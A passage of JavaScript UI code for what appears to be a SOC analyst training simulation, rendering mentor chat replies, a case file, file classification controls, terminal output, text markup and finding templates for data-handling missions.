        <span class="sim-comms-replies-label">Choose your reply to Sarah</span>
        ${opts}
      </div>`;
  } else {
    const chosen = cfg.options.find(o => o.id === ans);
    html += `
      <div class="sim-comms-msg sim-comms-msg--you">
        <div class="sim-comms-bubble">${chosen ? chosen.label : ''}</div>
        <span class="sim-comms-avatar sim-comms-avatar--you" aria-hidden="true">YOU</span>
      </div>`;
    if (chosen && chosen.feedback) {
      html += `
      <div class="sim-comms-msg sim-comms-msg--sarah">
        <span class="sim-comms-avatar" aria-hidden="true">SR</span>
        <div class="sim-comms-bubble sim-comms-bubble--reply">${commsSpeech(chosen.feedback)}</div>
      </div>`;
    }
  }
  html += `
    </div>`;
  return html;
}

/* One finding worked as a live comms exchange with Sarah — the two-step loop in
 * chat form. Step 1 ("what stands out?") opens as soon as the finding surfaces;
 * step 2 ("why does it matter?") appears only after step 1 is recorded. The card
 * border + status pill track pending vs logged ONLY — never right/wrong — and no
 * grade label is ever shown. Recording still flows through setDiscoveryJudgment. */
/* Reconsideration annotation on a LOGGED notebook card. While Sarah's pivot is
 * pending it shows a "Reconsider" badge pointing the analyst at the dock; once the
 * analyst revises/holds it records that posture + Sarah's reply inline. Display-only,
 * read straight from SIM.reconsiderations — never grades, never reopens the call. */
function reconsiderAnnotationHtml(ch) {
  const rcs = reconsiderationsForTarget(ch.id);
  if (!rcs.length) return '';
  return rcs.map(rc => {
    const ans = reconsiderAnswer(rc);
    if (!ans) {
      return `
      <div class="sim-reconsider-note sim-reconsider-note--pending">
        <span class="sim-reconsider-badge"><span class="sim-reconsider-glyph" aria-hidden="true">\u21BB</span>Reconsider</span>
        <span class="sim-reconsider-text">New evidence may change this call — Sarah's waiting on your read in the Decision Dock below.</span>
      </div>`;
    }
    const chosen = rc.options.find(o => o.id === ans);
    const mod = ans === 'revise' ? 'revised' : (ans === 'hold' ? 'held' : 'done');
    const verdictLabel = ans === 'revise' ? 'Revised' : (ans === 'hold' ? 'Held' : 'Reconsidered');
    const reply = chosen && chosen.feedback
      ? `<div class="sim-comms-msg sim-comms-msg--sarah"><span class="sim-comms-avatar" aria-hidden="true">SR</span><div class="sim-comms-bubble sim-comms-bubble--reply">${commsSpeech(chosen.feedback)}</div></div>`
      : '';
    return `
      <div class="sim-reconsider-note sim-reconsider-note--done sim-reconsider-note--${mod}">
        <span class="sim-reconsider-badge sim-reconsider-badge--${mod}">${verdictLabel}</span>
        <div class="sim-reconsider-thread">
          <div class="sim-comms-msg sim-comms-msg--you"><div class="sim-comms-bubble">${chosen ? chosen.label : ''}</div><span class="sim-comms-avatar sim-comms-avatar--you" aria-hidden="true">YOU</span></div>
          ${reply}
        </div>
      </div>`;
  }).join('');
}

function discoveryCardHtml(ch) {
  if (!challengeValid(ch)) return '';
  const obsAnswered = stepAnswered(ch, 'observation');
  const full = challengeAnswered(ch);
  const obsHtml = discoveryStepHtml(ch, 'observation', 'What stands out?');
  const justHtml = obsAnswered ? discoveryStepHtml(ch, 'justification', 'Why does it matter?') : '';
  const statusPill = full
    ? `<span class="sim-comms-state sim-comms-state--logged">Call logged</span>`
    : `<span class="sim-comms-state sim-comms-state--live">On the line</span>`;
  const foot = full
    ? `<div class="sim-comms-foot">Logged with Sarah — she has your read on ${ch.short || 'this finding'}.</div>`
    : '';
  // Pivot annotation only ever attaches to an already-logged call (the dock shows
  // pending cards, so this never renders there).
  const reconsider = full ? reconsiderAnnotationHtml(ch) : '';
  const cardMod = full ? ' sim-comms--logged' : ' sim-comms--pending';
  return `
    <div class="sim-comms${cardMod}" data-ev="${ch.evidenceId || ''}" data-challenge="${ch.id}">
      <div class="sim-comms-head">
        <span class="sim-comms-channel"><span class="sim-comms-dot" aria-hidden="true"></span>SARAH REYES · ${ch.short || ''}</span>
        ${statusPill}
      </div>
      <div class="sim-comms-thread">
        ${obsHtml}
        ${justHtml}
      </div>
      ${foot}
      ${reconsider}
    </div>`;
}

/* The ANALYST JUDGMENT section — one card per SURFACED challenge. '' until the
 * first triggering finding surfaces (and '' for non-challenge missions). */
function analystJudgmentHtml() {
  const vis = visibleDiscoveryChallenges().filter(challengeValid);
  if (!vis.length) return '';
  // The notebook is now a QUIET, READ-ONLY record of calls already logged with
  // Sarah. Anything still pending lives in the Decision Dock beneath the terminal
  // (where it locks the command line until answered), so it never renders twice.
  const logged = loggedDiscoveryChallenges();
  const body = logged.length
    ? logged.map(discoveryCardHtml).join('')
    : `<p class="sim-comms-empty">No calls logged yet. When Sarah needs your read it appears in the <strong>Decision Dock</strong> beneath the terminal — answer there and it is recorded here.</p>`;
  return `
    <div class="sim-notebook-section">
      <div class="sim-notebook-head sim-notebook-head--comms" tabindex="-1">${simpleUiMode() ? 'CASE HISTORY' : 'DECISIONS LOGGED'} <span class="sim-notebook-count">${logged.length}/${vis.length}</span></div>
      ${body}
    </div>`;
}

/* Plain-language "what to do next", case-file flavour. Pending judgments first. */
function caseFileNextStep() {
  const vis = visibleDiscoveryChallenges().filter(challengeValid);
  if (vis.some(c => !stepAnswered(c, 'observation'))) return 'Record what stands out on your latest finding.';
  if (vis.some(c => !stepAnswered(c, 'justification'))) return 'Explain why your latest finding matters.';
  const undiscovered = simFiles().filter(f => !fileClassificationVisible(f));
  if (undiscovered.length) return `Investigate the remaining ${undiscovered.length} file(s) — cat to deep-read or grep to scan — to surface more evidence.`;
  const unclassified = simFiles().filter(f => fileClassificationVisible(f) && !SIM.classified[f.name]);
  if (unclassified.length) return 'Classify each file you have reviewed.';
  if (SIM.def && SIM.def.identify && !SIM.identified) return 'Record your determination, then type  decide  to choose your response.';
  if (SIM.stage === 'investigation') return 'When the evidence is in, type  decide  to choose your response.';
  return '';
}

/* One labelled case-file row. */
function caseFileRow(tag, mod, bodyHtml) {
  return `
    <div class="sim-casefile-row sim-casefile-row--${mod}">
      <span class="sim-casefile-tag sim-casefile-tag--${mod}">${tag}</span>
      <div class="sim-casefile-body">${bodyHtml}</div>
    </div>`;
}

/* The case file — a synthesis of the reactive risks (FACT / UNKNOWNS), the graded
 * judgments (ASSESSMENT / REASON) and the response plan (RECOMMENDATIONS). On
 * caseFileNotebook missions this replaces the POTENTIAL RISKS + reflection cards. */
function caseFileSummaryHtml() {
  const risks = (SIM.def && SIM.def.risks) || [];
  const confirmed = risks.filter(riskConfirmed);
  const openRisks = risks.filter(r => !riskConfirmed(r));
  const answered = simDiscoveryChallenges().filter(challengeAnswered);

  // FACT — established from surfaced evidence.
  const factBody = confirmed.length
    ? `<ul class="sim-casefile-list">${confirmed.map(r => `<li>${r.label}</li>`).join('')}</ul>`
    : `<span class="sim-casefile-empty">No facts established yet — review the files in the terminal.</span>`;

  // ASSESSMENT — the calls you made on comms (what you told Sarah stood out).
  // Presentation-only: lists your recorded reads, never a correctness mark.
  const assessBody = answered.length
    ? `<ul class="sim-casefile-list">${answered.map(c => {
        const obs = challengeStep(c, 'observation').options.find(o => o.id === challengeAnswers(c).observation);
        return `<li class="sim-casefile-call">${c.short}: ${obs ? obs.label : ''}</li>`;
      }).join('')}</ul>`
    : `<span class="sim-casefile-empty">No analyst calls recorded yet.</span>`;

  // REASON — the justification you chose, with Sarah Reyes' note on each.
  const reasonBody = answered.length
    ? `<ul class="sim-casefile-list">${answered.map(c => {
        const just = challengeStep(c, 'justification').options.find(o => o.id === challengeAnswers(c).justification);
        return `<li>${just ? just.feedback : ''}</li>`;
      }).join('')}</ul>`
    : `<span class="sim-casefile-empty">Record a judgment to capture the reasoning.</span>`;

  // UNKNOWNS — open risks + unread files + pending judgments.
  const unkItems = [];
  openRisks.forEach(r => unkItems.push(r.label));
  const undiscovered = simFiles().filter(f => !fileClassificationVisible(f));
  if (undiscovered.length) unkItems.push(`${undiscovered.length} file(s) not yet investigated`);
  const pending = visibleDiscoveryChallenges().filter(c => challengeValid(c) && !challengeAnswered(c));
  if (pending.length) unkItems.push(`${pending.length} finding(s) awaiting your judgment`);
  const unkBody = unkItems.length
    ? `<ul class="sim-casefile-list">${unkItems.map(u => `<li>${u}</li>`).join('')}</ul>`
    : `<span class="sim-casefile-empty">All known threads resolved.</span>`;

  // RECOMMENDATIONS — the recorded response, or the next step.
  let recBody;
  if (SIM.decision) {
    const d = SIM.decision;
    let chosen = '';
    if (d.actionId) { const a = (SIM.def.actions || []).find(x => x.id === d.actionId); chosen = a ? a.label : d.actionId; }
    else if (d.recommendationId) { const rc = (SIM.def.recommendations || {})[d.recommendationId]; chosen = rc ? rc.label : d.recommendationId; }
    recBody = `<span class="sim-casefile-done">Response recorded — ${chosen || 'submitted'}</span>`;
  } else {
    const ns = caseFileNextStep();
    recBody = ns ? `<span class="sim-casefile-next">${ns}</span>` : `<span class="sim-casefile-empty">—</span>`;
  }

  return `
    <div class="sim-casefile">
      <div class="sim-casefile-head">CASE FILE</div>
      ${caseFileRow('FACT', 'fact', factBody)}
      ${caseFileRow('ASSESSMENT', 'assess', assessBody)}
      ${caseFileRow('REASON', 'reason', reasonBody)}
      ${caseFileRow('UNKNOWNS', 'unknown', unkBody)}
      ${caseFileRow('RECOMMENDATIONS', 'rec', recBody)}
    </div>`;
}

/* File classification rows. Beginner mode adds a plain-language note about what
 * each file holds, plus a legend explaining the four levels (glossary tooltips).
 * Classification logic/scoring is unchanged — only the helper text is new. */
function renderClassifyHtml(mode) {
  const visFiles = simFiles().filter(fileClassificationVisible);
  if (!visFiles.length) return '';
  const legend = mode === 'beginner' ? classifyLegendHtml() : '';
  const rows = visFiles.map(f => {
    const chosen = SIM.classified[f.name];
    const opts = CLASSIFICATIONS.map(c =>
      `<button type="button" class="sim-classify-btn${chosen === c.id ? ' sim-classify-btn--active' : ''}" data-classify-file="${f.name}" data-classify-val="${c.id}" title="${classDef(c.id)}">${c.label}</button>`
    ).join('');
    const note = (mode === 'beginner' && f.beginnerNote)
      ? `<div class="sim-classify-hint">${f.beginnerNote}</div>` : '';
    return `<div class="sim-classify-row"><div class="sim-classify-file">${f.name}</div>${note}<div class="sim-classify-opts">${opts}</div></div>`;
  }).join('');
  const done = simFiles().filter(f => SIM.classified[f.name]).length;
  return `
    <div class="sim-classify">
      <div class="sim-classify-head">FILE CLASSIFICATION — ${done}/${simFiles().length}</div>
      ${legend}
      ${rows}
    </div>`;
}
function classifyLegendHtml() {
  const chips = CLASSIFICATIONS.map(c => glossaryTermHtml(c.id)).filter(Boolean).join(' ');
  if (!chips) return '';
  return `<div class="sim-classify-legend"><span class="sim-classify-legend-label">What the levels mean:</span> ${chips}</div>`;
}
function classDef(id) { const g = glossaryEntry(id); return g ? g.definition : ''; }

/* ------------------------------------------------------------------ *
 * Panel 3 — Terminal output + action dock
 * ------------------------------------------------------------------ */
function renderTerminalPanel() {
  const out = document.getElementById('simTerminal');
  if (out) {
    out.innerHTML = '';
    const intro = (SIM.def && SIM.def.intro) || [
      { t: 'CyberCorp SOC // Career Operating Center', c: 'head' },
    ];
    intro.forEach(line => simPrint(line.t, line.c));
  }
  const actions = document.getElementById('simActions');
  if (actions) {
    actions.innerHTML = `<p class="sim-empty">Investigate first — review the files, then type <strong>decide</strong> to choose a handling action.</p>`;
  }
}

/* ------------------------------------------------------------------ *
 * Panel 4 — Feedback & Consequence (initial empty state)
 * ------------------------------------------------------------------ */
/* Simplified Mission 1: the Feedback & Consequence panel (and the right-column row
 * it occupies) stays hidden until the player makes a decision, so the first-day
 * workspace is just terminal + Decision Dock + Case Board. Toggling
 * .career-col--right-solo collapses the column to a single row so the notebook
 * fills it. Gated on the per-mission flag — a no-op for M2-M4. Presentation-only. */
function setFeedbackPanelHidden(hide) {
  const host = document.getElementById('simFeedback');
  if (!host) return;
  host.hidden = !!hide;
  const col = host.closest('.career-col--right');
  if (col) col.classList.toggle('career-col--right-solo', !!hide);
}

function renderFeedbackPanel() {
  const host = document.getElementById('simFeedback');
  if (!host) return;
  host.innerHTML = `
    <div class="sim-panel-head">FEEDBACK &amp; CONSEQUENCE</div>
    <div class="sim-feedback-body" id="simFeedbackBody">
      <p class="sim-empty">Your decisions and their organizational consequences will appear here.</p>
    </div>`;
  // Held back until the first decision in simple mode (revealed by the decision
  // handlers below); always visible in the full layout.
  setFeedbackPanelHidden(simpleUiMode() && !SIM.decision);
}

/* ------------------------------------------------------------------ *
 * Command-output grouping. Each typed command opens a group container;
 * its echoed command line and all of its result lines are appended into
 * it, so a single left accent line (CSS .sim-term-group) marks the whole
 * unit and visually separates one command's output from the next. System
 * lines printed OUTSIDE a command (the mission intro, the post-decision
 * "✓ Logged with Sarah." handoff) stay ungrouped. Presentation-only — it
 * changes only where existing lines are appended, never what is printed. */
let simTermGroup = null;

/* Where the next terminal line is appended: the open command group if it is
 * still attached, else the terminal root. Self-heals if the group was
 * detached by `clear` / a re-render (resets the stale pointer). */
function simTermTarget(out) {
  if (simTermGroup && out.contains(simTermGroup)) return simTermGroup;
  simTermGroup = null;
  return out;
}

/* Open a fresh group for the command about to print. */
function simBeginTermGroup() {
  const out = document.getElementById('simTerminal');
  if (!out) { simTermGroup = null; return; }
  const g = document.createElement('div');
  g.className = 'sim-term-group';
  out.appendChild(g);
  simTermGroup = g;
}

/* Close the current group so later lines render ungrouped (no accent). */
function simEndTermGroup() { simTermGroup = null; }

/* Terminal print helper (used across P1–P4). */
function simPrint(text, cls) {
  const out = document.getElementById('simTerminal');
  if (!out) return;
  const line = document.createElement('div');
  line.className = 'sim-term-line' + (cls ? ' sim-term-line--' + cls : '');
  line.textContent = text == null ? '' : text;
  simTermTarget(out).appendChild(line);
  out.scrollTop = out.scrollHeight;
}

/* Pin the terminal to its latest output. Used when the Decision Dock opens so the
 * dock never visually buries the most recent command output. Presentation-only. */
function scrollTerminalToLatest() {
  const out = document.getElementById('simTerminal');
  if (out) out.scrollTop = out.scrollHeight;
}

/* Append a terminal line of click-to-run command chips. Each chip is a real
 * <button> built with createElement/textContent (filenames/labels come from
 * mission data, so no HTML is interpolated). Clicking routes through the existing
 * simRunCommand() chokepoint via the delegated [data-run-cmd] handler — no new
 * command path, same decisionLocked()/briefOpen guards. Presentation-only. */
function simPrintCmdChips(label, chips) {
  const out = document.getElementById('simTerminal');
  if (!out || !Array.isArray(chips) || !chips.length) return;
  const line = document.createElement('div');
  line.className = 'sim-term-line sim-term-line--chips';
  if (label) {
    const lab = document.createElement('span');
    lab.className = 'sim-chips-label';
    lab.textContent = label;
    line.appendChild(lab);
  }
  chips.forEach(c => {
    if (!c || !c.cmd) return;
    const b = document.createElement('button');
    b.type = 'button';
    b.className = 'sim-cmd-chip' + (c.done ? ' sim-cmd-chip--done' : '');
    b.setAttribute('data-run-cmd', c.cmd);
    b.textContent = c.label || c.cmd;
    line.appendChild(b);
  });
  simTermTarget(out).appendChild(line);
  out.scrollTop = out.scrollHeight;
}

/* ================================================================== *
 * NOTEBOOK PHASE 3 — inline evidence mark-up (file-model missions)
 * ------------------------------------------------------------------ *
 * Presentation / view-state ONLY. The player selects text in the file
 * view and tags it Fact / Anomaly / Unknown. Anomaly routes attention to
 * the matching discovery challenge's pending step in the Sarah comms
 * thread — recording STILL flows only through setDiscoveryJudgment; no
 * keyed answer is ever revealed. Highlights are canonical records on
 * SIM.markup, re-derived on every render — never detached DOM / live Range.
 * ================================================================== */

/* Only file-model caseFileNotebook missions get mark-up (Mission 1 today).
 * Command-model missions (def.commands[]) never print file lines, so they are
 * unaffected; this guard keeps every entry point a no-op for them. */
function markupEnabled() {
  const d = SIM.def;
  return !!(d && d.caseFileNotebook && Array.isArray(d.files) && d.files.length
            && !(Array.isArray(d.commands) && d.commands.length));
}

/* In-memory telemetry mirror (console.debug + a capped ring buffer on SIM).
 * Never persisted — same discipline as powerLog. */
function nbLog(ev, detail) {
  try {
    const rec = Object.assign({ t: Date.now(), ev }, detail || {});
    const buf = SIM.markupLog || (SIM.markupLog = []);
    buf.push(rec);
    if (buf.length > 200) buf.shift();
    if (typeof console !== 'undefined' && console.debug) console.debug('[notebook]', ev, detail || '');
  } catch (_) { /* telemetry must never throw */ }
}

function markupTagLabel(tag) {
  return tag === 'fact' ? 'Fact' : tag === 'anomaly' ? 'Anomaly' : 'Unknown';
}

/* Map a source file to its discovery challenge via the shared evidence id. May
 * be null — some files carry evidence with no challenge; those still mark up,
 * they just do not route into comms. Never exposes any keyed answer. */
function markupChallengeForFile(fileName) {
  const d = SIM.def; if (!d) return null;
  const file = (d.files || []).find(f => f.name === fileName);
  if (!file || !Array.isArray(file.evidenceIds)) return null;
  const chs = d.discoveryChallenges || [];
  for (const evId of file.evidenceIds) {
    const ch = chs.find(c => c.evidenceId === evId);
    if (ch) return ch.id;
  }
  return null;
}

function markupMarksFor(fileName, lineIndex) {
  return (SIM.markup || []).filter(m => m.file === fileName && m.line === lineIndex);
}

/* Escape + wrap each [start,end) range of a file-line's ORIGINAL text in a
 * labeled highlight span. Idempotent: the original text is cached on
 * span.dataset.raw so repeated decoration stays stable. */
function decorateFileText(span, marks) {
  if (!span) return;
  const text = span.dataset.raw != null ? span.dataset.raw : (span.dataset.raw = span.textContent);
  if (!marks || !marks.length) { span.textContent = text; return; }
  const sorted = marks.slice().sort((a, b) => a.start - b.start);
  let html = '', cursor = 0;
  for (const m of sorted) {
    const start = Math.max(cursor, Math.min(m.start, text.length));
    const end = Math.max(start, Math.min(m.end, text.length));
    if (start > cursor) html += mapEsc(text.slice(cursor, start));
    if (end > start) {
      const seg = text.slice(start, end);
      html += `<span class="sim-markup sim-markup--${mapEsc(m.tag)}" data-markup-id="${mapEsc(m.id)}"`
        + ` tabindex="0" role="button"`
        + ` aria-label="${mapEsc(markupTagLabel(m.tag))} mark: ${mapEsc(seg)}${m.challengeId ? '. Press Enter to reopen in comms.' : ''}"`
        + ` title="${mapEsc(markupTagLabel(m.tag))}${m.challengeId ? ' — reopen in comms' : ''}">${mapEsc(seg)}</span>`;
      cursor = end;
    }
  }
  if (cursor < text.length) html += mapEsc(text.slice(cursor));
  span.innerHTML = html;
}

/* Apply current SIM.markup to one already-printed file line element. */
function applyMarkupToLine(lineEl) {
  if (!lineEl) return;
  const span = lineEl.querySelector('.sim-file-text');
  if (!span) return;
  decorateFileText(span, markupMarksFor(lineEl.dataset.file, Number(lineEl.dataset.line)));
}

/* Re-decorate every printed line for a file (the terminal is append-only, so a
 * file may appear multiple times from repeated reads — decorate all copies). */
function refreshMarkupForFile(fileName) {
  const out = document.getElementById('simTerminal');
  if (!out) return;
  out.querySelectorAll('.sim-term-line--fileline[data-file]').forEach(el => {
    if (el.dataset.file === fileName) applyMarkupToLine(el);
  });
}

/* Print one selectable, focusable file-content line (Phase 3). */
function simPrintFileLine(fileName, lineIndex, text) {
  const out = document.getElementById('simTerminal');
  if (!out) return;
  const line = document.createElement('div');
  line.className = 'sim-term-line sim-term-line--file sim-term-line--fileline';
  line.dataset.file = fileName;
  line.dataset.line = String(lineIndex);
  line.dataset.fileline = '1';
  line.setAttribute('tabindex', '0');
  line.setAttribute('role', 'button');
  line.setAttribute('aria-label', 'Mark up line: ' + (text && text.trim() ? text : '(blank line)'));
  const gutter = document.createElement('span');
  gutter.className = 'sim-file-gutter';
  gutter.setAttribute('aria-hidden', 'true');
  gutter.textContent = '  ';
  const span = document.createElement('span');
  span.className = 'sim-file-text';
  span.textContent = text == null ? '' : text;
  span.dataset.raw = span.textContent;
  line.appendChild(gutter);
  line.appendChild(span);
  simTermTarget(out).appendChild(line);
  out.scrollTop = out.scrollHeight;
  applyMarkupToLine(line);
}

/* ----- selection capture (mouse) + whole-line capture (keyboard) ----- */
function closestFileText(node) {
  if (!node) return null;
  const el = node.nodeType === 3 ? node.parentElement : node;
  return el ? el.closest('.sim-file-text') : null;
}

/* Character offset of (container, offset) within a .sim-file-text's raw text,
 * accumulating across any highlight child spans so offsets stay relative to the
 * ORIGINAL content regardless of existing decoration. */
function offsetWithinFileText(span, container, offset) {
  let total = 0, done = false;
  const textLen = node => {
    if (node.nodeType === 3) return node.nodeValue.length;
    let n = 0; node.childNodes.forEach(ch => { n += textLen(ch); }); return n;
  };
  const walk = node => {
    if (done) return;
    if (node === container) {
      if (node.nodeType === 3) { total += offset; }
      else { for (let i = 0; i < offset && i < node.childNodes.length; i++) total += textLen(node.childNodes[i]); }
      done = true; return;
    }
    if (node.nodeType === 3) { total += node.nodeValue.length; return; }
    node.childNodes.forEach(ch => { if (!done) walk(ch); });
  };
  walk(span);
  return total;
}

function trimRange(raw, s, e) {
  while (s < e && /\s/.test(raw[s])) s++;
  while (e > s && /\s/.test(raw[e - 1])) e--;
  return [s, e];
}

function onTerminalSelection() {
  if (!markupEnabled()) return;
  const sel = window.getSelection && window.getSelection();
  if (!sel || sel.isCollapsed || !sel.rangeCount) { hideMarkupPopover(); return; }
  const range = sel.getRangeAt(0);
  const startSpan = closestFileText(range.startContainer);
  const endSpan = closestFileText(range.endContainer);
  if (!startSpan) { hideMarkupPopover(); return; }
  if (startSpan !== endSpan) {   // cross-line / header / spacer — gentle cue, no mark
    markupCue('Mark up one line at a time.', range.getBoundingClientRect());
    SIM.pendingSelection = null;
    return;
  }
  const lineEl = startSpan.closest('.sim-term-line--fileline');
  if (!lineEl) { hideMarkupPopover(); return; }
  const raw = startSpan.dataset.raw != null ? startSpan.dataset.raw : startSpan.textContent;
  let s = offsetWithinFileText(startSpan, range.startContainer, range.startOffset);
  let e = offsetWithinFileText(startSpan, range.endContainer, range.endOffset);
  if (s > e) { const t = s; s = e; e = t; }
  [s, e] = trimRange(raw, s, e);
  if (e <= s) { hideMarkupPopover(); return; }
  SIM.pendingSelection = { file: lineEl.dataset.file, line: Number(lineEl.dataset.line), start: s, end: e, text: raw.slice(s, e) };
  showMarkupPopover(range.getBoundingClientRect());
}

/* Keyboard path: Enter/Space on a focused file line stages the WHOLE line. */
function markupWholeLine(lineEl) {
  if (!markupEnabled() || !lineEl) return;
  const span = lineEl.querySelector('.sim-file-text');
  const raw = span ? (span.dataset.raw != null ? span.dataset.raw : span.textContent) : '';
  let [s, e] = trimRange(raw, 0, raw.length);
  if (e <= s) return;
  SIM.pendingSelection = { file: lineEl.dataset.file, line: Number(lineEl.dataset.line), start: s, end: e, text: raw.slice(s, e) };
  showMarkupPopover(lineEl.getBoundingClientRect());
}

/* ----- the Fact / Anomaly / Unknown popover ----- */
function markupPopoverEl() {
  let el = document.getElementById('simMarkupPopover');
  if (!el) {
    el = document.createElement('div');
    el.id = 'simMarkupPopover';
    el.className = 'sim-markup-pop';
    el.hidden = true;
    (document.getElementById('careerOps') || document.body).appendChild(el);
  }
  return el;
}

function positionMarkupPopover(el, rect) {
  if (!rect) return;
  el.style.position = 'fixed';
  el.style.visibility = 'hidden';
  el.hidden = false;
  const w = el.offsetWidth || 240, h = el.offsetHeight || 34;
  let left = rect.left + rect.width / 2 - w / 2;
  let top = rect.top - h - 8;
  if (top < 8) top = rect.bottom + 8;
  left = Math.max(8, Math.min(left, window.innerWidth - w - 8));
  top = Math.max(8, Math.min(top, window.innerHeight - h - 8));
  el.style.left = left + 'px';
  el.style.top = top + 'px';
  el.style.visibility = '';
}

function showMarkupPopover(rect) {
  const el = markupPopoverEl();
  clearTimeout(el._cueT);
  el.classList.remove('sim-markup-pop--cue');
  el.innerHTML =
    '<span class="sim-markup-pop-label">Mark up</span>'
    + '<button type="button" class="sim-markup-pop-btn sim-markup-pop-btn--fact" data-markup-tag="fact">Fact</button>'
    + '<button type="button" class="sim-markup-pop-btn sim-markup-pop-btn--anomaly" data-markup-tag="anomaly">Anomaly</button>'
    + '<button type="button" class="sim-markup-pop-btn sim-markup-pop-btn--unknown" data-markup-tag="unknown">Unknown</button>';
  positionMarkupPopover(el, rect);
  el.hidden = false;
  const first = el.querySelector('.sim-markup-pop-btn');
  if (first) setTimeout(() => { try { first.focus({ preventScroll: true }); } catch (_) { first.focus(); } }, 0);
}

/* Brief, auto-dismissing in-world hint reusing the popover shell. */
function markupCue(text, rect) {
  const el = markupPopoverEl();
  el.classList.add('sim-markup-pop--cue');
  el.innerHTML = '<span class="sim-markup-pop-cue">' + mapEsc(text) + '</span>';
  positionMarkupPopover(el, rect);
  el.hidden = false;
  clearTimeout(el._cueT);
  el._cueT = setTimeout(() => { el.hidden = true; el.classList.remove('sim-markup-pop--cue'); }, 1800);
}

function hideMarkupPopover() {
  const el = document.getElementById('simMarkupPopover');
  if (el) { clearTimeout(el._cueT); el.hidden = true; el.classList.remove('sim-markup-pop--cue'); }
  SIM.pendingSelection = null;
}

/* Commit a pending selection as a labeled mark; Anomaly routes into comms. */
function applyMarkupTag(tag) {
  const s = SIM.pendingSelection;
  const popRect = lineRect(s);
  hideMarkupPopover();
  if (!s) return;
  const challengeId = markupChallengeForFile(s.file);
  const mark = {
    id: 'mk' + (++SIM.markupSeq), file: s.file, line: s.line,
    start: s.start, end: s.end, tag, text: s.text, challengeId: challengeId || null,
  };
  SIM.markup.push(mark);
  nbLog('markup-created', { tag, file: s.file, hasChallenge: !!challengeId });
  refreshMarkupForFile(s.file);
  if (tag === 'anomaly' && challengeId) {
    nbLog('markup-routed', { challengeId });
    openChallengeInComms(challengeId);
  } else if (tag === 'anomaly') {
    markupCue('Logged as an anomaly in your notes.', popRect);
  }
  try { const sel = window.getSelection(); if (sel) sel.removeAllRanges(); } catch (_) { /* ignore */ }
}

/* Reopen the decision a highlight is linked to (click or Enter on the mark). */
function reopenMarkup(id) {
  const m = (SIM.markup || []).find(x => x.id === id);
  if (!m) return;
  nbLog('markup-reopened', { id, challengeId: m.challengeId || null });
  if (m.challengeId) openChallengeInComms(m.challengeId);
}

/* Bounding rect of the matching printed file line (cue anchor). */
function lineRect(s) {
  if (!s) return null;
  const out = document.getElementById('simTerminal');
  if (!out) return null;
  let found = null;
  out.querySelectorAll('.sim-term-line--fileline[data-file]').forEach(el => {
    if (el.dataset.file === s.file && Number(el.dataset.line) === s.line) found = el;
  });
  return found ? found.getBoundingClientRect() : null;
}

/* Route attention to a challenge's pending comms step. NEVER reveals the keyed
 * option — it only scrolls to and focuses the EXISTING pending reply (Phase 1
 * renderer). If the challenge is already fully logged, it just scrolls there. */
function openChallengeInComms(challengeId) {
  const host = document.getElementById('simEvidence');
  if (!host) return;
  renderEvidencePanel(); // ensure the card exists (evidence may have just surfaced)
  // The scroll container is the inner .sim-evidence-body (no #simEvidenceBody id
  // exists); target it so routed comms actually scroll into view, not the host.
  const body = host.querySelector('.sim-evidence-body') || host;
  const card = host.querySelector('.sim-comms[data-challenge="' + challengeId + '"]');
  if (!card) return;
  card.classList.add('sim-comms--summoned');
  setTimeout(() => card.classList.remove('sim-comms--summoned'), 1400);
  simScrollBodyTo(body, card);
  const reply = card.querySelector('.sim-comms-reply');
  if (reply) setTimeout(() => { try { reply.focus({ preventScroll: true }); } catch (_) { reply.focus(); } }, 80);
  else { const head = card.querySelector('.sim-comms-head'); if (head) head.setAttribute('tabindex', '-1'); }
}

/* ================================================================== *
 * PHASE 4 — AUTO-COMPOSED FINDINGS (presentation / view-state only)
 * ------------------------------------------------------------------ *
 * Once a discovery challenge is fully answered, the notebook auto-drafts
 * a 1-2 sentence "finding" for the player: a template with a few editable
 * {chips}. Chips offer alternative wordings the analyst can cycle through
 * (their words, their call) and committing snapshots the sentence to an
 * on-screen case-file timeline. EVERYTHING here is display-only:
 *   - chip edits live on SIM.findingChips and NEVER touch
 *     SIM.discoveryJudgments or any grading helper;
 *   - committed findings live on SIM.committedFindings (transient, never
 *     persisted / synced);
 *   - findings derive from the challenge that surfaced, not from which
 *     option the player picked, so no keyed answer is ever revealed.
 * Templates are keyed by challenge id in a registry (not inlined into the
 * mission defs) so a challenge with no entry simply yields no finding.
 * ================================================================== */
const FINDING_TEMPLATES = {
  // ---- Mission 1 — Data Handling Review ----
  ch_release_context: {
    template: 'The release was assembled by {who} with {review}, so {risk}.',
    chips: [
      { key: 'who', value: 'an external contractor', alts: ['an outside vendor account', 'a non-employee account'] },
      { key: 'review', value: 'no internal sign-off', alts: ['no data-owner approval', 'no internal review'] },
      { key: 'risk', value: 'nobody inside vetted what is leaving the company', alts: ['the contents left the building unchecked', 'there is no accountable owner for the release'] },
    ],
  },
  ch_public_safe: {
    template: 'The product datasheet is {nature}, so it {risk}.',
    chips: [
      { key: 'nature', value: 'already-published marketing collateral', alts: ['public, marketing-cleared material', 'externally released content'] },
      { key: 'risk', value: 'carries no new exposure if it ships', alts: ['is safe to include in the release', 'needs no further restriction'] },
    ],
  },
  ch_pii_salary: {
    template: 'The salary file {contains}, which makes it {tier} and {risk}.',
    chips: [
      { key: 'contains', value: 'ties named employees to their pay', alts: ['links individuals to their compensation', 'holds named salary records'] },
      { key: 'tier', value: 'Restricted', alts: ['the top classification tier', 'the highest sensitivity'] },
      { key: 'risk', value: 'must never leave the company', alts: ['cannot reach a partner', 'must stay strictly internal'] },
    ],
  },
  ch_customer_pii: {
    template: 'The package includes {data}, so sending it out {risk}.',
    chips: [
      { key: 'data', value: 'regulated cardholder records', alts: ['customer payment data', 'PCI card records'] },
      { key: 'risk', value: 'would be a reportable data breach', alts: ['breaches regulated-data rules', 'creates real customer harm and fines'] },
    ],
  },
  ch_contractor_access: {
    template: 'A {actor} was {action}, which I am logging as {stance}.',
    chips: [
      { key: 'actor', value: 'contractor account (ext-contractor-07)', alts: ['vendor account', 'non-employee account'] },
      { key: 'action', value: 'reading HR/Finance files at 02:00, outside its remit', alts: ['reaching data far outside its job at 2 AM', 'touching salaries and roadmaps overnight'] },
      { key: 'stance', value: 'something to flag and escalate', alts: ['activity that warrants a closer look', { text: 'probably routine release prep', warn: 'That softer wording understates the off-hours, out-of-scope access you noted above.' }] },
    ],
  },
  // ---- Mission 2 — Network Asset Investigation ----
  ch_m2_device: {
    template: 'The unknown laptop is {whose}, which {risk}.',
    chips: [
